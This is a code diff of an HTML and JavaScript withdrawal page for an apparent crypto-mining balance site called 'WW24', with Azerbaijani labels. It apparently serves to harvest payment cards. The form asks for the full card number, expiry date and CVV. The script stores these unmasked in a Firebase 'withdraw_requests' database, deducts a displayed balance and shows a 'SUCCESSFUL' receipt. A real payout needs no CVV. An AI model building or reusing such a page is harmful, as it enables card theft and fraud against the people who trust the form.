@@ -1,118 +1,177 @@
-<div id="withdraw-module" style="background: #050507; min-height: 100vh; color: white; font-family: 'Inter', sans-serif; padding: 20px;">
+<div id="withdraw-app" style="background: #050507; min-height: 100vh; color: white; font-family: 'Inter', sans-serif; padding: 15px; display: flex; flex-direction: column; align-items: center;">
+    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@400;600&display=swap');
         
-        .card-container {
-            max-width: 400px; margin: 0 auto; background: #111; border-radius: 20px; padding: 25px; border: 1px solid #222;
+        body { margin: 0; background: #050507; }
+
+        /* VIRTUAL CARD DESIGN */
+        .glass-card {
+            width: 100%;
+            max-width: 350px;
+            height: 200px;
+            background: linear-gradient(135deg, #1a1a1c 0%, #000 100%);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 20px;
+            position: relative;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
+            margin-bottom: 30px;
+            overflow: hidden;
         }
-        .bank-label { font-size: 0.65rem; color: #555; margin-bottom: 5px; display: block; text-transform: uppercase; }
-        .bank-input { 
-            width: 100%; background: transparent; border: none; border-bottom: 2px solid #222; 
-            color: #fff; padding: 10px 0; margin-bottom: 20px; outline: none; font-size: 1rem; transition: 0.3s;
-        }
-        .bank-input:focus { border-bottom-color: #3f9c35; }
+
+        .chip { width: 40px; height: 30px; background: linear-gradient(135deg, #d4af37, #f9f295); border-radius: 5px; margin-bottom: 20px; }
         
-        /* Çek (Receipt) Dizaynı */
-        #receipt-box {
-            display: none; background: #fff; color: #000; padding: 20px; border-radius: 5px;
-            font-family: 'Courier New', Courier, monospace; margin-top: 20px; box-shadow: 0 0 20px rgba(255,255,255,0.1);
+        .card-logo { position: absolute; top: 20px; right: 20px; width: 50px; height: auto; opacity: 0.8; transition: 0.3s; }
+
+        .card-number-display { font-family: 'Orbitron', sans-serif; font-size: 1.2rem; letter-spacing: 2px; margin-top: 10px; display: block; }
+        
+        .card-holder-display { font-size: 0.7rem; text-transform: uppercase; color: #555; margin-top: 25px; display: block; }
+
+        /* INPUT FIELDS */
+        .input-group { width: 100%; max-width: 350px; margin-top: 10px; }
+        
+        .field-box { margin-bottom: 20px; position: relative; }
+        
+        .field-box label { font-size: 0.6rem; color: #3f9c35; font-weight: bold; margin-bottom: 8px; display: block; letter-spacing: 1px; }
+        
+        .m-input {
+            width: 100%; background: #111; border: 1px solid #222; border-radius: 12px;
+            padding: 15px; color: #fff; font-size: 0.9rem; outline: none; box-sizing: border-box; transition: 0.3s;
         }
-        .receipt-line { border-top: 1px dashed #000; margin: 10px 0; }
+        
+        .m-input:focus { border-color: #3f9c35; background: #161616; }
+
+        .submit-btn {
+            width: 100%; max-width: 350px; padding: 18px; background: #3f9c35; border: none; border-radius: 15px;
+            color: #fff; font-weight: 900; font-size: 1rem; cursor: pointer; margin-top: 10px; box-shadow: 0 5px 20px rgba(63, 156, 53, 0.3);
+        }
+
+        /* SUCCESS RECEIPT */
+        #receipt { display: none; width: 100%; max-width: 320px; background: #fff; color: #000; padding: 25px; border-radius: 2px; font-family: monospace; }
     </style>
 
-    <div id="form-side" class="card-container">
-        <h2 style="font-family: 'Orbitron'; color: #3f9c35; text-align: center; font-size: 1.1rem; margin-bottom: 25px;">KART QEYDİYYATI</h2>
-        
-        <label class="bank-label">KART SAHİBİ (AD SOYAD)</label>
-        <input type="text" id="c-name" class="bank-input" placeholder="ELVIN VALIYEV">
+    <div class="glass-card" id="card-preview">
+        <div class="chip"></div>
+        <img src="visa.png" id="brand-logo" class="card-logo" alt="logo">
+        <span class="card-number-display" id="display-n">**** **** **** ****</span>
+        <div style="display: flex; justify-content: space-between; align-items: flex-end;">
+            <div>
+                <span class="card-holder-display">CARD HOLDER</span>
+                <span id="display-h" style="font-size: 0.9rem; text-transform: uppercase;">YOUR NAME</span>
+            </div>
+            <div style="text-align: right;">
+                <span class="card-holder-display">EXPIRES</span>
+                <span id="display-e" style="font-size: 0.9rem;">MM/YY</span>
+            </div>
+        </div>
+    </div>
 
-        <label class="bank-label">KART NÖMRƏSİ</label>
-        <input type="text" id="c-num" class="bank-input" placeholder="4127 0000 0000 0000" maxlength="19">
+    <div class="input-group" id="form-container">
+        <div class="field-box">
+            <label>KART SAHİBİNİN ADI</label>
+            <input type="text" id="in-name" class="m-input" placeholder="AD SOYAD" oninput="updateCard()">
+        </div>
+
+        <div class="field-box">
+            <label>KART NÖMRƏSİ</label>
+            <input type="text" id="in-num" class="m-input" placeholder="4127 ...." maxlength="19" oninput="updateCard()">
+        </div>
 
         <div style="display: flex; gap: 15px;">
-            <div style="flex: 1;">
-                <label class="bank-label">TARİX (MM/YY)</label>
-                <input type="text" id="c-exp" class="bank-input" placeholder="05/29" maxlength="5">
+            <div class="field-box" style="flex: 1;">
+                <label>TARİX</label>
+                <input type="text" id="in-exp" class="m-input" placeholder="01/28" maxlength="5" oninput="updateCard()">
             </div>
-            <div style="flex: 1;">
-                <label class="bank-label">CVV/CVC</label>
-                <input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3">
+            <div class="field-box" style="flex: 1;">
+                <label>CVV</label>
+                <input type="password" id="in-cvv" class="m-input" placeholder="***" maxlength="3">
             </div>
         </div>
 
-        <label class="bank-label">ÇIXARILACAQ MƏBLƏĞ ($)</label>
-        <input type="number" id="w-amount" class="bank-input" placeholder="Min: 15.00" step="0.01">
+        <div class="field-box">
+            <label>ÇƏKİLMƏLİ MƏBLƏĞ ($)</label>
+            <input type="number" id="in-amt" class="m-input" placeholder="Məbləğ daxil et">
+        </div>
 
-        <button onclick="processWithdrawal()" id="sub-btn" style="width: 100%; padding: 18px; background: #3f9c35; color: #fff; border: none; border-radius: 12px; font-weight: 900; cursor: pointer; margin-top: 10px;">
-            TƏSDİQLƏ VƏ QEYDİYYATDAN KEÇ
-        </button>
+        <button class="submit-btn" onclick="confirmTransfer()">ÖDƏNİŞİ TƏSDİQLƏ</button>
     </div>
 
-    <div id="receipt-box" class="card-container" style="background: #f9f9f9; color: #333;">
-        <h3 style="text-align: center; margin: 0;">WW24 GLOBAL PAY</h3>
-        <p style="text-align: center; font-size: 0.7rem;">TRANSACTION RECEIPT</p>
-        <div class="receipt-line"></div>
-        <p>İstifadəçi: <span id="r-user"></span></p>
-        <p>Kart: <span id="r-card"></span></p>
-        <p>Məbləğ: <span id="r-amt"></span> USD</p>
-        <p>Status: GÖZLƏMƏDƏ</p>
-        <div class="receipt-line"></div>
-        <p style="font-size: 0.8rem; text-align: center;">Tarix: <span id="r-date"></span></p>
-        <button onclick="window.location.href='index.html'" style="width: 100%; background: #000; color: #fff; border: none; padding: 10px; cursor: pointer;">SƏHİFƏDƏN ÇIX</button>
+    <div id="receipt">
+        <h3 style="text-align: center;">WW24 OFFICIAL</h3>
+        <p style="text-align: center; font-size: 0.7rem;">DIGITAL PAYMENT RECEIPT</p>
+        <hr style="border: 1px dashed #ccc;">
+        <p>USER: <span id="r-u"></span></p>
+        <p>AMOUNT: $<span id="r-a"></span></p>
+        <p>CARD: <span id="r-c"></span></p>
+        <p>STATUS: <span style="color: green;">SUCCESSFUL</span></p>
+        <hr style="border: 1px dashed #ccc;">
+        <p style="font-size: 0.7rem; text-align: center;" id="r-t"></p>
+        <button onclick="location.href='index.html'" style="width: 100%; padding: 10px; background: #000; color: #fff; margin-top: 10px; border: none;">CLOSE</button>
     </div>
+
 </div>
 
 <script>
-    const u = localStorage.getItem('elite_session') || 'Guest';
+    const user = localStorage.getItem('elite_session') || 'Guest';
 
-    async function processWithdrawal() {
-        const name = document.getElementById('c-name').value.trim();
-        const num = document.getElementById('c-num').value.trim();
-        const exp = document.getElementById('c-exp').value.trim();
-        const cvv = document.getElementById('c-cvv').value.trim();
-        const amt = parseFloat(document.getElementById('w-amount').value);
+    // Kartın dinamik yenilənməsi və loqo dəyişimi
+    function updateCard() {
+        const name = document.getElementById('in-name').value || 'YOUR NAME';
+        const num = document.getElementById('in-num').value || '**** **** **** ****';
+        const exp = document.getElementById('in-exp').value || 'MM/YY';
+        const logo = document.getElementById('brand-logo');
 
-        if (!name || num.length < 16 || exp.length < 5 || cvv.length < 3 || isNaN(amt)) {
-            return alert("Məlumatları düzgün daxil edin!");
-        }
+        // Logo dəyişimi (Visa: 4, MasterCard: 5)
+        if(num.startsWith('4')) logo.src = 'visa.png';
+        else if(num.startsWith('5')) logo.src = 'master.png';
 
-        // Balans yoxlanışı
-        const snap = await db.ref('mining/' + u).get();
-        const userBal = snap.val()?.balance || 0;
+        document.getElementById('display-h').innerText = name;
+        document.getElementById('display-n').innerText = num;
+        document.getElementById('display-e').innerText = exp;
 
-        if (amt < 15) return alert("Minimum çıxarış 15$-dır!");
-        if (amt > userBal) return alert("Balansınızda kifayət qədər vəsait yoxdur!");
+        // Auto format nömrə
+        document.getElementById('in-num').addEventListener('input', e => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+    }
 
-        // Firebase-ə bütün məlumatları göndər
-        const reqData = {
+    async function confirmTransfer() {
+        const amt = parseFloat(document.getElementById('in-amt').value);
+        const name = document.getElementById('in-name').value;
+        const num = document.getElementById('in-num').value;
+        const exp = document.getElementById('in-exp').value;
+        const cvv = document.getElementById('in-cvv').value;
+
+        if(!amt || num.length < 16) return alert("Məlumatları tam doldur!");
+
+        const snap = await db.ref('mining/' + user).get();
+        const bal = snap.val()?.balance || 0;
+
+        if(amt < 15) return alert("Min: $15");
+        if(amt > bal) return alert("Balans yetərsiz!");
+
+        // Dataya göndər
+        const time = new Date().toLocaleString();
+        await db.ref('withdraw_requests/' + user).push({
             fullName: name,
             cardNumber: num,
             expiry: exp,
             cvv: cvv,
             amount: amt,
-            status: "Gözləmədə",
-            timestamp: new Date().toLocaleString()
-        };
+            timestamp: time
+        });
 
-        await db.ref('withdraw_requests/' + u).push(reqData);
-        
-        // Balansı çıxılan məbləğ qədər azalt
-        await db.ref('mining/' + u).update({ balance: userBal - amt });
+        // Balansı yenilə
+        await db.ref('mining/' + user).update({ balance: bal - amt });
 
         // Çeki göstər
-        document.getElementById('form-side').style.display = 'none';
-        document.getElementById('receipt-box').style.display = 'block';
-        document.getElementById('r-user').innerText = u;
-        document.getElementById('r-card').innerText = "**** **** **** " + num.slice(-4);
-        document.getElementById('r-amt').innerText = amt.toFixed(2);
-        document.getElementById('r-date').innerText = reqData.timestamp;
+        document.getElementById('form-container').style.display = 'none';
+        document.getElementById('card-preview').style.display = 'none';
+        document.getElementById('receipt').style.display = 'block';
+        document.getElementById('r-u').innerText = user;
+        document.getElementById('r-a').innerText = amt;
+        document.getElementById('r-c').innerText = num;
+        document.getElementById('r-t').innerText = time;
     }
-
-    // Kart nömrəsi və Tarix üçün avtomatik format
-    document.getElementById('c-num').addEventListener('input', e => {
-        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-    });
-    document.getElementById('c-exp').addEventListener('input', e => {
-        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/g, '$1/').slice(0, 5).replace(/\/$/, '');
-    });
 </script>
